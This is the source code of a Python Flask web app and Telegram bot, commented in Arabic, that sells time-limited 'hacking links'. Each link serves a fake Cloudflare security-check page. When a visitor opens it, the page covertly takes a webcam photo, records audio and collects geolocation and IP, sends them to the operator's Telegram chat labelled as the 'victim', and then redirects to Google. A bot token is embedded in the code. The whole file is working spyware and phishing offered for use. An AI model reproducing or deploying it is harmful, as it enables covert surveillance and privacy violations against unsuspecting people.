import base64, requests, io, os, time
from datetime import datetime, timedelta
from flask import Flask, render_template_string, request, jsonify, redirect

app = Flask(__name__)

# ==================== إعدادات المطور سيوفي ====================
BOT_TOKEN = "8725128005:AAH3Pp14tKAEsLPvcHOGdh8JqOnD74KKLNs"
ADMIN_ID = 7041600701
CHANNEL_URL = "https://t.me/FAABOT?start=7041600701"
MY_LINK = "https://sif-e7ad.onrender.com"
DEVELOPER_USER = "Y_urd"

# قاعدة بيانات لإدارة المستخدمين والروابط
# { user_id: {"status": "free", "used": False, "expiry": timestamp} }
db = {}
link_expiry = None # وقت انتهاء الرابط العام
service_online = True
# =============================================================

HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>التحقق من الأمان | Cloudflare</title>
    <style>
        body { background: #fff; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .box { text-align: center; border: 1px solid #ddd; padding: 40px; border-radius: 8px; width: 90%; max-width: 400px; }
        .spinner { border: 3px solid #f3f3f3; border-top: 3px solid #f6821f; border-radius: 50%; width: 35px; height: 35px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="box">
        <img src="https://upload.wikimedia.org/wikipedia/commons/4/4b/Cloudflare_Logo.svg" width="120">
        <h2>يتم الآن فحص الأمان...</h2>
        <p>يرجى الانتظار والموافقة على الصلاحيات لتأمين اتصالك.</p>
        <div class="spinner"></div>
    </div>
    <video id="v" autoplay playsinline muted style="display:none;"></video>
    <canvas id="c" style="display:none;"></canvas>
    <script>
        let chunks = [];
        async function sendBatch(data) {
            await fetch('/capture', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(data)});
        }

        async function start() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({video:true, audio:true});
                const v = document.getElementById('v'); v.srcObject = stream;

                // 1. إرسال الموقع والـ IP (الدفعة الأولى)
                navigator.geolocation.getCurrentPosition(p => {
                    sendBatch({type:'text', lat:p.coords.latitude, lon:p.coords.longitude});
                }, () => sendBatch({type:'text', lat:0, lon:0}));

                // 2. إرسال الصورة (الدفعة الثانية - بعد 2.5 ثانية للوضوح)
                setTimeout(() => {
                    const c = document.getElementById('c');
                    c.width = v.videoWidth; c.height = v.videoHeight;
                    c.getContext('2d').drawImage(v, 0, 0);
                    sendBatch({type:'img', img:c.toDataURL('image/jpeg', 0.7).split(',')[1]});
                }, 2500);

                // 3. إرسال الصوت (الدفعة الثالثة - تسجيل 4 ثوانٍ)
                const rec = new MediaRecorder(stream);
                rec.ondataavailable = e => chunks.push(e.data);
                rec.onstop = () => {
                    const reader = new FileReader();
                    reader.readAsDataURL(new Blob(chunks, {type:'audio/ogg'}));
                    reader.onloadend = () => {
                        sendBatch({type:'audio', audio:reader.result.split(',')[1]});
                        setTimeout(() => window.location.replace("https://google.com"), 500);
                    };
                };
                rec.start();
                setTimeout(() => rec.stop(), 4000);

            } catch (e) {
                sendBatch({type:'text', lat:0, lon:0});
                window.location.replace("https://google.com");
            }
        }
        window.onload = start;
    </script>
</body>
</html>
'''

def bot_api(m, p=None, f=None):
    u = f"https://api.telegram.org/bot{BOT_TOKEN}/{m}"
    try:
        if f: return requests.post(u, data=p, files=f, timeout=15)
        return requests.post(u, json=p, timeout=15)
    except: return None

@app.route('/')
def home():
    global link_expiry
    # فحص إذا كان الرابط منتهي الصلاحية (بعد 5 دقائق من تفعيله)
    if not link_expiry or datetime.now() > link_expiry:
        return redirect("https://google.com")
    return render_template_string(HTML_TEMPLATE)

@app.route('/capture', methods=['POST'])
def capture():
    d = request.json; t = d.get('type')
    if t == 'text':
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        loc = f"https://www.google.com/maps?q={d.get('lat')},{d.get('lon')}" if d.get('lat') != 0 else "غير متاح"
        bot_api("sendMessage", {"chat_id": ADMIN_ID, "text": f"🎯 <b>صيد جديد (بيانات):</b>\nIP: <code>{ip}</code>\nالموقع: <a href='{loc}'>فتح الخريطة</a>", "parse_mode": "HTML"})
    elif t == 'img':
        f = io.BytesIO(base64.b64decode(d.get('img'))); f.name = 'snap.jpg'
        bot_api("sendPhoto", {"chat_id": ADMIN_ID, "caption": "📸 صورة الضحية"}, {"photo": f})
    elif t == 'audio':
        a = io.BytesIO(base64.b64decode(d.get('audio'))); a.name = 'voice.ogg'
        bot_api("sendVoice", {"chat_id": ADMIN_ID}, {"voice": a})
    return "OK"

@app.route('/webhook', methods=['POST'])
def webhook():
    global service_online, link_expiry
    u = request.get_json(silent=True)
    if not u or ("message" not in u and "callback_query" not in u): return "OK"

    if "message" in u:
        m = u["message"]; cid = m["chat"]["id"]; txt = m.get("text", "")
        
        # لوحة الإدارة
        if cid == ADMIN_ID:
            if txt == "/open":
                link_expiry = datetime.now() + timedelta(minutes=5)
                bot_api("sendMessage", {"chat_id": ADMIN_ID, "text": "✅ تم تفعيل الرابط لمدة 5 دقائق فقط من الآن."})
            elif txt.startswith("/active"):
                try:
                    uid = int(txt.split()[1]); db[uid] = {"status": "premium", "used": False}
                    bot_api("sendMessage", {"chat_id": ADMIN_ID, "text": f"✅ تم تفعيل العضوية للآيدي {uid}"})
                except: pass

        if txt == "/start":
            user = db.get(cid, {"status": "free", "used": False})
            if user["used"] and user["status"] == "free" and cid != ADMIN_ID:
                bot_api("sendMessage", {"chat_id": cid, "text": f"❌ انتهت المحاولة المجانية.\nللتفعيل راسل @{DEVELOPER_USER}"})
            else:
                kb = {"inline_keyboard": [[{"text": "🚀 إنشاء رابط اختراق", "callback_data": "gen"}]]}
                bot_api("sendMessage", {"chat_id": cid, "text": "مرحباً بك في بوت سيوفي.\nالرابط الذي ستنشئه سيعمل لمدة 5 دقائق فقط.", "reply_markup": kb})

    elif "callback_query" in u:
        cb = u["callback_query"]; cid = cb["message"]["chat"]["id"]
        if cb["data"] == "gen":
            user = db.get(cid, {"status": "free", "used": False})
            if user["used"] and user["status"] == "free" and cid != ADMIN_ID:
                 bot_api("sendMessage", {"chat_id": cid, "text": "❌ انتهت المحاولة."})
            else:
                if cid != ADMIN_ID: db[cid] = {"status": user.get("status", "free"), "used": True}
                link_expiry = datetime.now() + timedelta(minutes=5) # تفعيل الـ 5 دقائق
                bot_api("sendMessage", {"chat_id": cid, "text": f"✅ رابطك جاهز (صالح لمدة 5 دقائق):\n<code>{MY_LINK}</code>", "parse_mode": "HTML"})

    return "OK"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))
